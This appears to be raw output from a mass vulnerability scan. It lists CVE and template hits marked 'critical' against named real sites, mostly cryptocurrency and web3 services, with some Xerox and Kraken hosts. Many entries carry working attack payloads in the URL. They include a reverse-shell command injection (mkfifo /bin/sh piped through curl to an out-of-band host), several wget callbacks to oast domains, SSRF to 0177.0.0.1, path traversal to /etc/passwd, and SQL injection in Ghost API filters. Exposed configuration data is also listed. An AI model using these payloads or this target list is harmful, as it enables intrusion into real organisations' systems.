+[CVE-2018-17173] [http] [critical] https://fakevod.ant.fun/qsr_server/device/getThumbnail?sourceUri=\'%2b-%253brm%2b/tmp/f%253bmkfifo%2b/tmp/f%253bcat%2b/tmp/f|/bin/sh%2b-i%2b2>%25261|curl%2bhttp%253a//d9krflklr2r3erlen4lgozkxugciwpx4i.oast.site%2b>/tmp/f%253b\';&targetUri=%2Ftmp%2Fthumb%2Ftest.jpg&mediaType=image&targetWidth=400&targetHeight=400&scaleType=crop&_=1537275717150
+[CVE-2020-7796] [http] [critical] https://fakevod.ant.fun/zimlet/com_zimbra_webex/httpPost.jsp?companyId=http://d9krflklr2r3erlen4lgddh4wxeqowcqf.oast.site%23
+[CVE-2021-32305] [http] [critical] https://fakevod.ant.fun/search.php?search=%22;wget+http%3A%2F%2Fd9krflklr2r3erlen4lg5kgj6m4poucwc.oast.site%27;%22
+[CVE-2023-34993] [http] [critical] https://fakevod.ant.fun/ems/cgi-bin/ezrf_upgrade_images.cgi?op_type=deleteprogressfile&progressfile=U3TM7%3Bcurl%20d9krflklr2r3erlen4lg5a58xn8dwhbmu.oast.site%20%23
+[config-json-exposure-fuzz] [http] [critical] https://memecoin.fun/api/v1/config.json [path="/api/v1/config.json"]
+[CVE-2026-26980] [http] [critical] https://blog.web3auth.io/ghost/api/content/tags/?key=24330868b746f42d2fb5110e63&filter=slug:['||CASE+WHEN+1=0+THEN+0+ELSE+EXP(710)+END||',hash-import-2024-02-27-00-35]
+[CVE-2026-33032] [http] [critical] https://op-proxy.rpc-proxy.zora.co/mcp_message
+[CVE-2026-33032] [http] [critical] https://relayer-testnet.zerodev.app/mcp_message
+[CVE-2026-33032] [http] [critical] https://relayer.zerodev.app/mcp_message
+[CVE-2026-33032] [http] [critical] https://rpc.hoodi.taiko.xyz/mcp_message
+[CVE-2026-33032] [http] [critical] https://rpc.masaya.taiko.xyz/mcp_message
+[CVE-2026-33032] [http] [critical] https://rpc.taiko.xyz/mcp_message
+[CVE-2019-20933] [http] [critical] https://remote-write.switchboard.xyz/query?db=db&q=SHOW%20DATABASES
+[CVE-2021-28918] [http] [critical] https://docs.stacks.co/?url=http://0177.0.0.1/server-status
+[CVE-2025-49825] [http] [critical] https://teleport.infra.switchboard.xyz/webapi/ping ["Teleport Version: 17.5.1"]
+[pdf-signer-ssti-to-rce] [http] [critical] https://docs.stacks.co
+[CVE-2021-28918] [http] [critical] https://agentic-docs.polygon.technology/?url=http://0177.0.0.1/server-status
+[CVE-2021-28918] [http] [critical] https://doc.particle.network/?url=http://0177.0.0.1/server-status
+[CVE-2021-28918] [http] [critical] https://docs.nostra.finance/?url=http://0177.0.0.1/server-status
+[CVE-2021-28918] [http] [critical] https://docs.pancakeswap.finance/?url=http://0177.0.0.1/server-status
+[CVE-2021-28918] [http] [critical] https://whitepaper.particle.network/?url=http://0177.0.0.1/server-status
+[CVE-2025-2294] [http] [critical] https://agentic-docs.polygon.technology/?__kubio-site-edit-iframe-preview=1&__kubio-site-edit-iframe-classic-template=../../../../../../../../etc/passwd
+[CVE-2025-49825] [http] [critical] https://teleport.rakkardigital.com/webapi/ping ["Teleport Version: 11.3.1"]
+[CVE-2025-55182] [http] [critical] https://xxl-job.orderly.network
+[CVE-2026-26980] [http] [critical] https://ghost.orai.io/ghost/api/content/tags/?key=216d212889158b5dd09adee256&filter=slug:['||CASE+WHEN+1=0+THEN+0+ELSE+EXP(710)+END||',hash-nxh-nd]
+[CVE-2026-33032] [http] [critical] https://solana-mainnet-backend.phantom.app/mcp_message
+[config-json-exposure-fuzz:endpoints] [http] [critical] https://api.pol.polygon.technology/config.json [""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6954143928fc41e2df1645eb_2%20(2).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6900b8d1de6bc44e36ebd740_Manifold_Static_Cover.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68c360404529c241473e4b5d_Rio_Testnet%20blog%20cover.jpg"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68af229e0133476c8d9e7a64_Polygon_x_USDT0.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a1d9a81e825fb2f84c4589_wallets.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68cc2c7dc86d93a882d89cd1_CypherxPOL_1_2.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68b88332d8385ea67b4c228b_MATICPOL_Complete%20(1).jpg"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69445d06e82705ca170a9aa8_non-USD%20stablecoin%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6915fa915a5be905fd5f1fad_R25.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68f25ca38b5f6f2fd178cc59_payments%20101.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68de664c017b0e26ed0b4d74_Alloy%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/699de5f66450794cfac25a6d_Blog_Feb24%20(1)%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/691c5846dcf017ba7c793229_Revolut_Static.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/691b520eb0d404ae85ca1cb3_Mastercard_Polygon.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69020f49116940f0fb7db535_DCS_Static_Cover%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68dd0aa6fda8da7470558a33_immutable%20play%20polygon.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/699cbac0e45c0489bc294741_Coinme_Trust%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/694972be7338f7e4c6bf7271_Shift4%20announcement.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a998d755abe5d473050e17_CLI%206%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a6e6a6c2db55d73cf2abb1_FINAL%20Polygon%20x%20DeCard.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/699f40a0f9a722034fa0ca1b_BBRL%20(3).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6980badd87658ae7ec957cae_coinme%20case%20study.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69723c17303550ee9d55483b_putting%20open%20in%20open%20money%20stack.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69664feb9a8a61663ce88321_blog%20cover%20(2).jpg"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69148a21d70a7d1e370622d9_Calastone_Static_Cover.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a1fc8b98c13f922256601b_putting%20the%20stack%20in%20open%20money%20stack.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6995e91bcb79c45fc0dac26f_SequenceBlog.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/696f89fabb9df6b3a1ceed65_RZ_Announcement_v_01%20(0-00-08-03).jpg"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68e66a1e9e9ebb1e98d50e50_Rio%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69aab8614ac41c9231109fbb_LATAM%20stablecoins.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6942b3f50b2ffe7ce3229ee6_BOYSCLUB%20X%20POLYGON.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69380c8564deb621bdca89fa_Madhugiri_static.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/6903604aef39b3d82be0568e_Flutterwave_Static_Cover.png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/68e79c99358a38cf7f9916c2_Amina%20(2).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a85cd6fce8b63d6648d00c_Lisovo%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a6fc8342715be79b193097_Paxos%20on%20Polygon_Blog%20Cover%201%20(1).png"",""url":"https://cdn.prod.website-files.com/637e2b6d602973ea0941d482/69a04f1393460fd20f8ea736_JPYC.png""] [path="/config.json"]
+[config-json-exposure-fuzz:endpoints] [http] [critical] https://data.onekey.so/config.json [""url": "https://web.onekey-asset.com/hardware/touch/firmware/v4.10.0/touch.4.10.0-Stable-0304-834ea82.signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro/firmware/pro.4.12.0-Stable-0225-5379167_thd89_app_PROD_20250221_1.1.5_dfc6ccf_0x10.signed.bin"",""url": "https://apps.microsoft.com/store/detail/XPFMHZDDF91TNL"",""url": "https://appgallery.huawei.com/app/C107439249"",""url": "https://web.onekey-asset.com/hardware/classic/firmware/v3.10.0/classic.3.10.0-Stable-0512-7031656.signed.bin"",""url": "https://web.onekey-asset.com/hardware/mini/firmware/v3.10.0/mini.3.10.0-Stable-0516-a9a94d6.signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro/firmware/pro.4.9.1-Stable-0612-bacaa62.signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro/firmware/pro.4.14.0-Stable-0704-f23570e_1.1.5_dfc6ccf_0x10_1.1.6_dfcd608_0x13.signed.bin"",""url": "https://apps.apple.com/us/app/onekey-open-source-wallet/id1609559473"",""url": "https://web.onekey-asset.com/hardware/classic/firmware/v3.12.0/classic.3.12.0-Stable-0205-05bae9f.signed.bin"",""url": "https://web.onekey-asset.com/hardware/classic1s/firmware/v3.16.0/classic1s.3.16.0-Stable-be46692.thd89_app_PROD_20250813_1.1.7_353c593_0x10.signed.bin"",""url": "https://web.onekey-asset.com/hardware/classic1s/firmware/v3.11.0/classic1s.3.11.0-Stable-0318-4b3cbd7_thd89_app_PROD_20250221_1.1.5_dfc6ccf_0x10.align.signed.enc.bin"",""url": "https://common.onekey-asset.com/hw/legacy/2.11.0/mini.2.11.0-Stable-0323-19ff5d9-signed.bin"",""url": "https://common.onekey-asset.com/hw/touch/4.0.0/touch.4.0.0-Stable-0118-e901cef-signed.bin"",""url": "https://common.onekey-asset.com/hw/touch/3.4.0/touch.3.4.0-Stable-1120-38abffd-signed.bin"",""url": "https://web.onekey-asset.com/hardware/touch/firmware/v4.7.0/touch.4.7.0-Stable-1227-2c4d945-signed.bin"",""url": "https://web.onekey-asset.com/hardware/touch/firmware/v4.4.0/touch.4.4.0-Stable-0807-3e033eb.signed.bin"",""url": "https://common.onekey-asset.com/hw/legacy/3.0.0/mini.3.0.0-Stable-0518-b860d10.signed.bin"",""url": "https://web.onekey-asset.com/hardware/touch/firmware/v4.11.0/touch.4.11.0-Stable-0606-204425e.signed.bin"",""url": "https://web.onekey-asset.com/app-monorepo/v6.5.0/OneKey-Wallet-6.5.0-android.apk"",""url": "https://play.google.com/store/apps/details?id=so.onekey.app.wallet"",""url": "https://web.onekey-asset.com/hardware/classic/firmware/v3.4.0/classic.3.4.0-Stable-0917-d38a468.signed.bin"",""url": "https://web.onekey-asset.com/hardware/classic1s/firmware/v3.12.1/classic1s.3.12.1-Stable-1cf7797_thd89_app_PROD_20250221_1.1.5_dfc6ccf_0x10_merged.signed.bin"",""url": "https://web.onekey-asset.com/hardware/mini/firmware/v3.6.0/mini.3.6.0-Stable-1226-ff9efe5.signed.bin"",""url": "https://web.onekey-asset.com/hardware/mini/firmware/v3.9.0/mini.3.9.0-Stable-0807-a8b4519.signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro/firmware/pro.4.21.0-Stable-btc-0626-251a1b7_thd89_app_PROD_20250813_1.1.7_353c593_0x10_thd89_appfp_PROD_20250813_1.1.7_353c593_0x13.bin"",""url": "https://snapcraft.io/onekey-wallet"",""url": "https://web.onekey-asset.com/hardware/classic1s/firmware/v3.19.0/classic1s.3.19.0-Stable-btc-d4d9fab_thd89_app_PROD_20250813_1.1.7_353c593_0x10.signed.bin"",""url": "https://web.onekey-asset.com/hardware/touch/firmware/v4.12.0/Touch.4.12.0-Stable-1205-da09c43.signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro/firmware/pro.4.21.0-Stable-0626-251a1b7_thd89_app_PROD_20250813_1.1.7_353c593_0x10_thd89_appfp_PROD_20250813_1.1.7_353c593_0x13.bin"",""url": "https://web.onekey-asset.com/hardware/classic1s/firmware/v3.19.0/classic1s.3.19.0-Stable-d4d9fab_thd89_app_PROD_20250813_1.1.7_353c593_0x10.signed.bin"",""url": "https://web.onekey-asset.com/hardware/classic/firmware/v3.9.0/classic.3.9.0-Stable-0805-f3b0717.signed.bin"",""url": "https://web.onekey-asset.com/hardware/classic/firmware/v3.2.0/classic.3.2.0-Stable-0802-a013aec.signed.bin"",""url": "https://common.onekey-asset.com/hw/legacy/3.0.0/classic.3.0.0-Stable-0511-0bf60dd.signed.bin"",""url": "https://web.onekey-asset.com/hardware/mini/firmware/v3.2.0/mini.3.2.0-Stable-0802-6903c73.signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro/firmware/pro.4.18.0-Stable-1217-659efd6_thd89_app_PROD_20250813_1.1.7_353c593_0x10_thd89_appfp_PROD_20250813_1.1.7_353c593_0x13.signed.bin"",""url": "https://web.onekey-asset.com/hardware/classic/firmware/v3.11.0/classic.3.11.0-Stable-0908-75f1721.signed.bin"",""url": "https://common.onekey-asset.com/hw/legacy/2.11.0/classic.2.11.0-Stable-0323-c67044f.bin""] [path="/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://api.mainnet.orca.so/config.staging.json [path="/config.staging.json"]
+[pdf-signer-ssti-to-rce] [http] [critical] https://agentic-docs.polygon.technology
+[pdf-signer-ssti-to-rce] [http] [critical] https://doc.particle.network
+[pdf-signer-ssti-to-rce] [http] [critical] https://docs.nostra.finance
+[pdf-signer-ssti-to-rce] [http] [critical] https://docs.pancakeswap.finance
+[pdf-signer-ssti-to-rce] [http] [critical] https://whitepaper.particle.network
+[zimbra-preauth-ssrf] [http] [critical] https://mail.particle.network/service/error/sfdc_preauth.jsp?session=s&userid=1&server=http://d9bfap8226q3f1n3oejga9cpiq1jp8izx.oast.fun%23.salesforce.com/
+[CVE-2021-28918] [http] [critical] https://docs.bsc.lista.org/?url=http://0177.0.0.1/server-status
+[CVE-2022-26143:version] [http] [critical] https://solana.be.magiceden.io/ucs/micollab/version.json ["4.20.69"]
+[CVE-2026-33032] [http] [critical] https://rpc1.monad.xyz/mcp_message
+[config-json-exposure-fuzz:sensitive_endpoints] [http] [critical] https://support.kraken.com/config.json ["https://www.kraken.com/api"] [path="/config.json"]
+[config-json-exposure-fuzz:sensitive_endpoints] [http] [critical] https://www.kraken.com/config.json ["https://www.kraken.com/api"] [path="/config.json"]
+[pdf-signer-ssti-to-rce] [http] [critical] https://docs.bsc.lista.org
+[CVE-2014-3206] [http] [critical] https://ddocs-indexer.fileverse.io/backupmgt/localJob.php?session=fail;wget+http://d9c4gj0226q3ehsrcl0gxje64yky4e4f5.oast.me;
+[CVE-2014-3206] [http] [critical] https://ddocs-indexer.fileverse.io/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d9c4gj0226q3ehsrcl0g7yri9wsofo5p4.oast.me;
+[CVE-2014-3206] [http] [critical] https://identity-v1.fileverse.io/backupmgt/localJob.php?session=fail;wget+http://d9c55cdtsdp3ckgli8bgig539doxpseje.oast.online;
+[CVE-2014-3206] [http] [critical] https://identity-v1.fileverse.io/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d9c55cdtsdp3ckgli8bgobddubg3benjt.oast.online;
+[CVE-2021-28918] [http] [critical] https://dev.guardian.hedera.com/?url=http://0177.0.0.1/server-status
+[CVE-2021-28918] [http] [critical] https://guardian.hedera.com/?url=http://0177.0.0.1/server-status
+[CVE-2022-2488] [http] [critical] https://ddocs-indexer.fileverse.io/cgi-bin/touchlist_sync.cgi?IP=;wget+http://d9c4gj0226q3ehsrcl0gft4nj8rhqocgp.oast.me;
+[CVE-2022-2488] [http] [critical] https://identity-v1.fileverse.io/cgi-bin/touchlist_sync.cgi?IP=;wget+http://d9c55cdtsdp3ckgli8bg566qsond9xhgx.oast.online;
+[CVE-2026-33032] [http] [critical] https://rpc.euler.finance/mcp_message
+[CVE-2026-33032] [http] [critical] https://rpc2.euler.finance/mcp_message
+[pdf-signer-ssti-to-rce] [http] [critical] https://dev.guardian.hedera.com
+[pdf-signer-ssti-to-rce] [http] [critical] https://guardian.hedera.com
+[CVE-2026-26980] [http] [critical] https://blog.celestia.org/ghost/api/content/tags/?key=b1073dbfe30c92662ed3e52d20&filter=slug:['||CASE+WHEN+1=0+THEN+0+ELSE+EXP(710)+END||',hash-import-2025-02-27-15-27]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://mfe-fiat-send.sandbox.bvnk.com/config.json [""baseUrl": "https://api.sandbox.bvnk.com""] [path="/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://mfe-profile.staging.bvnk.com/config.json [""baseUrl": "https://api.staging.bvnk.com""] [path="/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://mfe-profile.test.bvnk.com/config.json [""baseUrl": "https://api.test.bvnk.com""] [path="/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://mfe-send.sandbox.bvnk.com/config.json [""baseUrl": "https://api.sandbox.bvnk.com""] [path="/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://mfe-send.staging.bvnk.com/config.json [""baseUrl": "https://api.staging.bvnk.com""] [path="/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://mfe-webhooks.bvnk.com/config.json [""baseUrl": "https://api.bvnk.com""] [path="/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://mfe-webhooks.sandbox.bvnk.com/config.json [""baseUrl": "https://api.sandbox.bvnk.com""] [path="/config.json"]
+[config-json-exposure-fuzz:endpoints] [http] [critical] https://packages.dynamic.xyz/settings.json [""url": "https://github.com/joona/settings.json"",""url": "https://github.com/joona/settings.json/issues""] [path="/settings.json"]
+[CVE-2021-28918] [http] [critical] https://legacy-docs.across.to/?url=http://0177.0.0.1/server-status
+[inspur-clusterengine-rce] [http] [critical] https://docs.availproject.org/docs/da/user-guides/staking-governance/overview
+[pdf-signer-ssti-to-rce] [http] [critical] https://legacy-docs.across.to
+[CVE-2025-29927] [http] [critical] https://app.edvisorly.com
+[CVE-2025-29927] [http] [critical] https://discover-fe-dev.edvisorly.com
+[CVE-2025-29927] [http] [critical] https://discover-fe-stag.edvisorly.com
+[CVE-2025-29927] [http] [critical] https://discover.edvisorly.com
+[config-json-exposure-fuzz] [http] [critical] https://dynamic-report-api.appsflyer.com/config.json [path="/config.json"]
+[CVE-2014-3206] [http] [critical] https://mail.particle.network/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d98b9io226q3em32fod0xztazctef8ju4.oast.site;
+[CVE-2025-34291] [http] [critical] https://internal.langflow.org/api/v1/refresh
+[CVE-2026-21445] [http] [critical] https://internal.langflow.org/api/v1/monitor/messages
+[CVE-2026-26980] [http] [critical] https://blog.web3auth.io/ghost/api/content/tags/?key=24330868b746f42d2fb5110e63&filter=slug:['||CASE+WHEN+1=0+THEN+0+ELSE+EXP(710)+END||',hash-import-2024-02-27-00-35]
+[CVE-2026-33017] [http] [critical] https://internal.langflow.org/api/v1/version
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://mfe-fiat-send.sandbox.bvnk.com/config.json [""baseUrl": "https://api.sandbox.bvnk.com""] [path="/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://mfe-fiat-send.test.bvnk.com/config.json [""baseUrl": "https://api.test.bvnk.com""] [path="/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://mfe-profile.staging.bvnk.com/config.json [""baseUrl": "https://api.staging.bvnk.com""] [path="/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://mfe-profile.test.bvnk.com/config.json [""baseUrl": "https://api.test.bvnk.com""] [path="/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://mfe-send.bvnk.com/config.json [""baseUrl": "https://api.bvnk.com""] [path="/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://mfe-send.sandbox.bvnk.com/config.json [""baseUrl": "https://api.sandbox.bvnk.com""] [path="/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://mfe-send.staging.bvnk.com/config.json [""baseUrl": "https://api.staging.bvnk.com""] [path="/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://mfe-webhooks.bvnk.com/config.json [""baseUrl": "https://api.bvnk.com""] [path="/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://mfe-webhooks.sandbox.bvnk.com/config.json [""baseUrl": "https://api.sandbox.bvnk.com""] [path="/config.json"]
+[config-json-exposure-fuzz:endpoints] [http] [critical] https://packages.dynamic.xyz/config.json [""url": "https://github.com/bulyshko/config.json"",""url": "https://github.com/bulyshko/config.json/issues"",""url": "https://bulyshko.com"",""url": "http://romualdbulyshko.com""] [path="/config.json"]
+[hashicorp-consul-rce] [http] [critical] https://mail.particle.network/v1/agent/service/register
+[CVE-2020-7796] [http] [critical] https://mail.particle.network/zimlet/com_zimbra_webex/httpPost.jsp?companyId=http://d97mem8226q3egtur41gtm9m9mb4p5qn5.oast.live%23
+[CVE-2021-28918] [http] [critical] https://doc.particle.network/?url=http://0177.0.0.1/server-status
+[CVE-2021-28918] [http] [critical] https://whitepaper.particle.network/?url=http://0177.0.0.1/server-status
+[CVE-2021-31755] [http] [critical] https://mail.particle.network/goform/setmac
+[CVE-2021-36380] [http] [critical] https://mail.particle.network/cgi/networkDiag.cgi
+[CVE-2022-26143:version] [http] [critical] https://chat.dappier.com/ucs/micollab/version.json ["1.0.0"]
+[CVE-2022-26143:version] [http] [critical] https://chat.dev.dappier.com/ucs/micollab/version.json ["1.0.0"]
+[CVE-2022-26143:version] [http] [critical] https://chat.staging.dappier.com/ucs/micollab/version.json ["1.0.0"]
+[CVE-2025-54236] [http] [critical] https://chat.dappier.com/customer/address_file/upload
+[CVE-2025-54236] [http] [critical] https://chat.dev.dappier.com/customer/address_file/upload
+[CVE-2025-54236] [http] [critical] https://chat.staging.dappier.com/customer/address_file/upload
+[CVE-2026-21858] [http] [critical] https://n8n.dappier.com/signin ["n8n Version: 1.120.4"]
+[CVE-2026-21877] [http] [critical] https://n8n.dappier.com/signin ["n8n Version: 1.120.4"]
+[CVE-2026-26980] [http] [critical] https://blog.web3auth.io/ghost/api/content/tags/?key=24330868b746f42d2fb5110e63&filter=slug:['||CASE+WHEN+1=0+THEN+0+ELSE+EXP(710)+END||',hash-import-2024-02-27-00-35]
+[CVE-2026-33017] [http] [critical] https://chat.dappier.com/api/v1/version
+[CVE-2026-33017] [http] [critical] https://chat.dev.dappier.com/api/v1/version
+[CVE-2026-33017] [http] [critical] https://chat.staging.dappier.com/api/v1/version
+[config-json-exposure-fuzz:endpoints] [http] [critical] https://packages.dynamic.xyz/config.json [""url": "http://romualdbulyshko.com"",""url": "https://github.com/bulyshko/config.json"",""url": "https://github.com/bulyshko/config.json/issues"",""url": "https://bulyshko.com""] [path="/config.json"]
+[hashicorp-consul-rce] [http] [critical] https://mail.particle.network/v1/agent/service/register
+[inspur-clusterengine-rce] [http] [critical] https://docs.availproject.org/docs/da/user-guides/staking-governance/overview
+[pdf-signer-ssti-to-rce] [http] [critical] https://doc.particle.network
+[pdf-signer-ssti-to-rce] [http] [critical] https://whitepaper.particle.network
+[config-json-exposure-fuzz] [http] [critical] https://test-echo.promova.com/app.config.json [path="/app.config.json"]
+[CVE-2014-3206] [http] [critical] https://ddocs-indexer.fileverse.io/backupmgt/localJob.php?session=fail;wget+http://d94457tulefjdnsorvog3z6z46kqoitsc.oast.fun;
+[CVE-2014-3206] [http] [critical] https://ddocs-indexer.fileverse.io/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d94457tulefjdnsorvogbe5w7fmugdk9y.oast.fun;
+[CVE-2014-3206] [http] [critical] https://identity-v1.fileverse.io/backupmgt/localJob.php?session=fail;wget+http://d9446ltulefjee89v1o0hw9qbyba14jo7.oast.live;
+[CVE-2014-3206] [http] [critical] https://identity-v1.fileverse.io/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d9446ltulefjee89v1o0taneok1y1ccsu.oast.live;
+[CVE-2019-20933] [http] [critical] https://remote-write.switchboard.xyz/query?db=db&q=SHOW%20DATABASES
+[CVE-2022-2488] [http] [critical] https://ddocs-indexer.fileverse.io/cgi-bin/touchlist_sync.cgi?IP=;wget+http://d94457tulefjdnsorvoggwwar35d5iqb5.oast.fun;
+[CVE-2022-2488] [http] [critical] https://identity-v1.fileverse.io/cgi-bin/touchlist_sync.cgi?IP=;wget+http://d9446ltulefjee89v1o0ziqm1186onp77.oast.live;
+[CVE-2025-49825] [http] [critical] https://teleport.infra.switchboard.xyz/webapi/ping ["Teleport Version: 17.5.1"]
+[CVE-2025-55182] [http] [critical] https://xxl-job.orderly.network
+[CVE-2026-33032] [http] [critical] https://btc-mainnet-backend.phantom.app/mcp_message
+[CVE-2026-33032] [http] [critical] https://eth-mainnet-backend.phantom.app/mcp_message
+[CVE-2026-33032] [http] [critical] https://eth-sepolia-backend.phantom.app/mcp_message
+[CVE-2026-33032] [http] [critical] https://polygon-amoy-backend.phantom.app/mcp_message
+[CVE-2026-33032] [http] [critical] https://polygon-mainnet-backend.phantom.app/mcp_message
+[CVE-2026-33032] [http] [critical] https://solana-mainnet-history-backend.phantom.app/mcp_message
+[CVE-2026-33032] [http] [critical] https://rpc.euler.finance/mcp_message
+[CVE-2026-33032] [http] [critical] https://rpc2.euler.finance/mcp_message
+[CVE-2026-33032] [http] [critical] https://rpc3.euler.finance/mcp_message
+[CVE-2026-33032] [http] [critical] https://rpc.euler.finance/mcp_message
+[CVE-2026-33032] [http] [critical] https://rpc2.euler.finance/mcp_message
+[CVE-2026-33032] [http] [critical] https://rpc3.euler.finance/mcp_message
+[CVE-2026-33032] [http] [critical] https://rpc.euler.finance/mcp_message
+[CVE-2026-33032] [http] [critical] https://rpc2.euler.finance/mcp_message
+[CVE-2026-33032] [http] [critical] https://rpc3.euler.finance/mcp_message
+[CVE-2026-33032] [http] [critical] https://btc-mainnet-backend.phantom.app/mcp_message
+[CVE-2026-33032] [http] [critical] https://eth-mainnet-backend.phantom.app/mcp_message
+[CVE-2026-33032] [http] [critical] https://eth-sepolia-backend.phantom.app/mcp_message
+[CVE-2026-33032] [http] [critical] https://polygon-amoy-backend.phantom.app/mcp_message
+[CVE-2026-33032] [http] [critical] https://polygon-mainnet-backend.phantom.app/mcp_message
+[CVE-2026-33032] [http] [critical] https://solana-mainnet-backend.phantom.app/mcp_message
+[CVE-2026-33032] [http] [critical] https://solana-mainnet-history-backend.phantom.app/mcp_message
+[config-json-exposure-fuzz] [http] [critical] https://api.mainnet.orca.so/conf.json [path="/conf.json"]
+[CVE-2026-21858] [http] [critical] https://n8n.dappier.com/signin ["n8n Version: 1.120.4"]
+[CVE-2026-21877] [http] [critical] https://n8n.dappier.com/signin ["n8n Version: 1.120.4"]
+[CVE-2020-3952:version] [http] [critical] https://usa0300lv2500-ext.epn.useastgw.xerox.com/sdk/ ["4.0.0"]
+[CVE-2020-3952:version] [http] [critical] https://vlpconproxy-msp.support.xerox.com/sdk/ ["4.0.0"]
+[CVE-2023-34048:version] [http] [critical] https://usa0300lv2500-ext.epn.useastgw.xerox.com/sdk/ ["4.0.0"]
+[CVE-2023-34048:version] [http] [critical] https://vlpconproxy-msp.support.xerox.com/sdk/ ["4.0.0"]
+[CVE-2025-54236] [http] [critical] https://mcstaging.shop.xerox.com/customer/address_file/upload
+[CVE-2026-26980] [http] [critical] https://blog.saner.ai/ghost/api/content/tags/?key=2d8e7b9323e902cd9e518a018d&filter=slug:['||CASE+WHEN+1=0+THEN+0+ELSE+EXP(710)+END||',hash-import-2025-06-13-04-23]
+[CVE-2014-3206] [http] [critical] https://mail.particle.network/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d8t1hkbomj13f5bqn77gewat5fi63pxjw.oast.live;
+[CVE-2021-36380] [http] [critical] https://mail.particle.network/cgi/networkDiag.cgi
+[CVE-2022-26143:version] [http] [critical] https://solana.be.magiceden.io/ucs/micollab/version.json ["4.20.69"]
+[CVE-2026-26980] [http] [critical] https://blog.web3auth.io/ghost/api/content/tags/?key=24330868b746f42d2fb5110e63&filter=slug:['||CASE+WHEN+1=0+THEN+0+ELSE+EXP(710)+END||',hash-import-2024-02-27-00-35]
+[CVE-2026-33032] [http] [critical] https://btc-mainnet-backend.phantom.app/mcp_message
+[CVE-2026-33032] [http] [critical] https://eth-mainnet-backend.phantom.app/mcp_message
+[CVE-2026-33032] [http] [critical] https://eth-sepolia-backend.phantom.app/mcp_message
+[CVE-2026-33032] [http] [critical] https://polygon-amoy-backend.phantom.app/mcp_message
+[CVE-2026-33032] [http] [critical] https://polygon-mainnet-backend.phantom.app/mcp_message
+[CVE-2026-33032] [http] [critical] https://solana-mainnet-backend.phantom.app/mcp_message
+[CVE-2026-33032] [http] [critical] https://solana-mainnet-history-backend.phantom.app/mcp_message
